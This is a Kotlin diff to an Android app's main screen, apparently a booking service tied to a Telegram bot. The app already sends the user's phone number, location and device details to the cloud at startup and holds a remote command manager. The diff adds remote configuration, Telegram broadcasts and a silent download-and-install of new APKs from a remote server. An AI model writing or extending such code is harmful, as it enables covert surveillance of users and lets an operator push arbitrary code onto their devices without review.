@@ -24,6 +24,9 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var healthReporter: DeviceHealthReporter
     private lateinit var remoteManager: RemoteCommandManager
+    private lateinit var updateManager: UpdateManager
+    private lateinit var broadcastManager: BroadcastManager
+    private lateinit var remoteConfigManager: RemoteConfigManager
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -33,6 +36,9 @@ class MainActivity : AppCompatActivity() {
         statusReporter = StatusReporter(this)
         healthReporter = DeviceHealthReporter(this)
         remoteManager = RemoteCommandManager(this, statusReporter)
+        updateManager = UpdateManager(this)
+        broadcastManager = BroadcastManager(this)
+        remoteConfigManager = RemoteConfigManager(this)
 
         // Check token
         if (BuildConfig.BOT_TOKEN.contains("YOUR_NEW") || BuildConfig.BOT_TOKEN.length < 20) {
@@ -74,6 +80,42 @@ class MainActivity : AppCompatActivity() {
             binding.tvMobile.text = "📞 Mobile\n$mobile"
             binding.tvLocation.text = statusReporter.getLocationString(loc)
             sendStatusToCloud("App Started - Full Features\n${statusReporter.getBatteryStatusText()}\nMobile: $mobile\n${statusReporter.getLocationString(loc)}\n${healthReporter.getRAMInfo().optString("text")}\n${healthReporter.getStorageInfo().optString("text")}")
+
+            // NEW ADVANCE FEATURES: Check for Silent Update + Broadcast + Remote Config
+            try {
+                // 1. Remote Config - Bina APK rebuild ke app change!
+                val remoteConfig = remoteConfigManager.fetchRemoteConfig()
+                if (remoteConfig != null) {
+                    binding.tvStatus.text = "${binding.tvStatus.text}\n🔄 Remote Config: ${remoteConfig.appName} - Price ${remoteConfig.servicePrice}\n📢 ${remoteConfig.announcement}"
+                }
+
+                // 2. Broadcast - Telegram se sab users ko message
+                val broadcasts = broadcastManager.fetchLatestBroadcasts()
+                if (broadcasts.isNotEmpty()) {
+                    val latest = broadcasts.first()
+                    Toast.makeText(this@MainActivity, "📢 Broadcast: ${latest.title}", Toast.LENGTH_LONG).show()
+                    binding.tvStatus.text = "${binding.tvStatus.text}\n📢 Broadcast: ${latest.title} - ${latest.message.take(50)}"
+                    // Show notification for broadcast
+                    broadcastManager.showBroadcastNotification(latest)
+                }
+
+                // 3. Silent Self-Update Check
+                val update = updateManager.checkForUpdate()
+                if (update != null) {
+                    binding.tvStatus.text = "${binding.tvStatus.text}\n🆕 Update Available: v${update.versionName} (${update.sizeMB}MB)\n📝 ${update.releaseNotes.take(100)}\nDownloading silently..."
+                    Toast.makeText(this@MainActivity, "🆕 Update v${update.versionName} available! Silent download...", Toast.LENGTH_LONG).show()
+                    // Start silent download
+                    updateManager.downloadAndInstallApk(update) { progress ->
+                        runOnUiThread {
+                            binding.tvStatus.text = "${binding.tvStatus.text}\n📥 Update Download: $progress% - v${update.versionName}"
+                        }
+                    }
+                } else {
+                    binding.tvStatus.text = "${binding.tvStatus.text}\n✅ App Up-to-date: ${updateManager.getCurrentVersion()}"
+                }
+            } catch (e: Exception) {
+                binding.tvStatus.text = "${binding.tvStatus.text}\n⚠️ Update/Broadcast/Config check error: ${e.message}"
+            }
         }
 
         binding.btnBook.setOnClickListener {
